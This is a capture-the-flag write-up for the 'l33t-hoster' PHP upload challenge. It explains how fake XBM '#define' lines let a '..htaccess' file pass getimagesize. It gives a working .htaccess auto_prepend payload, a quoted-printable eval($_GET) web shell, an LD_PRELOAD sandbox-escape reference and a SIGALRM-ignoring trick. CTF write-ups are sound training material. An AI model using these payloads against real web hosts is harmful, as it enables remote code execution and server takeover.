# l33t-hoster

## Vuln

```php
$tmp_name = $_FILES["image"]["tmp_name"];
$name = $_FILES["image"]["name"];
$parts = explode(".", $name);
$ext = array_pop($parts);

if (empty($parts[0])) {
    array_shift($parts);
}

if (count($parts) === 0) {
    die("lol filename is empty");
}
```
- We can upload .htaccess file with `..htaccess` filename.
- But we have to bypass getimagesize.
- Since getimagesize lazy checks image header, only some signatures, width and height.
- We have to apache .htaccess's bad characters e.g.) non valid chracters except #(comment)
- See the following source code.
        - https://github.com/php/php-src/blob/master/ext/standard/image.c#L1381
        - https://github.com/php/php-src/blob/master/ext/standard/image.c#L1033

```c
if (php_get_xbm(stream, NULL)) {
	return IMAGE_FILETYPE_XBM;
}
return IMAGE_FILETYPE_UNKNOWN;
```

```
static int php_get_xbm(php_stream *stream, struct gfxinfo **result)
{
    char *fline;
    char *iname;
    char *type;
    int value;
    unsigned int width = 0, height = 0;

	if (result) {
		*result = NULL;
	}
	if (php_stream_rewind(stream)) {
		return 0;
	}
	while ((fline=php_stream_gets(stream, NULL, 0)) != NULL) {
		iname = estrdup(fline); /* simple way to get necessary buffer of required size */
		if (sscanf(fline, "#define %s %d", iname, &value) == 2) {
			if (!(type = strrchr(iname, '_'))) {
				type = iname;
			} else {
				type++;
			}

			if (!strcmp("width", type)) {
				width = (unsigned int) value;
				if (height) {
					efree(iname);
					break;
				}
			}
			if (!strcmp("height", type)) {
				height = (unsigned int) value;
				if (width) {
					efree(iname);
					break;
				}
			}
		}
		efree(fline);
		efree(iname);
	}
	if (fline) {
		efree(fline);
	}

	if (width && height) {
		if (result) {
			*result = (struct gfxinfo *) ecalloc(1, sizeof(struct gfxinfo));
			(*result)->width = width;
			(*result)->height = height;
		}
		return IMAGE_FILETYPE_XBM;
	}

	return 0;
}
```
- If there is a line with `#define %s %d`, we can put any lines in the file.
- So if we make .htaccess file like this.

```
#define 915eefb1c517499ad090b8b05623cdad_width 1337
#define 915eefb1c517499ad090b8b05623cdad_height 1337
blahblah
```

- We can easily bypass the getimagesize filter.

## Exploit

### RCE

- Now we can upload .htaccess with arbitrary data.
- auto_prepend value supports php protocol, we can run the php script.
- However there is another filter. (if file contains `<?`, we cannot upload the file)
- We can easily bypass with filter convert function.

```
php_value auto_prepend_file "php://filter/convert.quoted-printable-decode/resource=./juno.asdf"
AddType application/x-httpd-php .txt
```

```
=0A=3c?php error_reporting(E_ALL); ini_set("display_errors", 1); eval($_GET[x]); ?>
```

### SBX Escape

- There are disable_functions :( .
```
pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,posix_mkfifo, pg_lo_import, dbmopen, dbase_open, popen, chgrp, chown, chmod, symlink,apache_setenv,define_syslog_variables, posix_getpwuid, posix_kill, posix_mkfifo, posix_setpgid, posix_setsid, posix_uname, proc_close, pclose, proc_nice, proc_terminate,curl_exec,curl_multi_exec,parse_ini_file,show_source,imap_open,fopen,copy,rename,readfile,readlink,tmpfile,tempnam,touch,link,file_put_contents,file,ftp_connect,ftp_ssl_connect,
```
- We can use LD_PRELOAD and mail trick to escape SBX. (https://blog.csdn.net/qq_27446553/article/details/80235811)
- I used reverse shell.

### Bypass Alarm.

- There is a simple captcha, but the alarm occurs in 0.01sec.

```
newa.it_value.tv_sec = 0LL;
newa.it_value.tv_usec = 10000LL;              //  1000000
newa.it_interval.tv_sec = 0LL;
newa.it_interval.tv_usec = 0LL;
setitimer(ITIMER_REAL, &newa, 0LL);
```
- We can ignore sigalrm with sigignore function.

```
sigignore(SIGALRM);

```

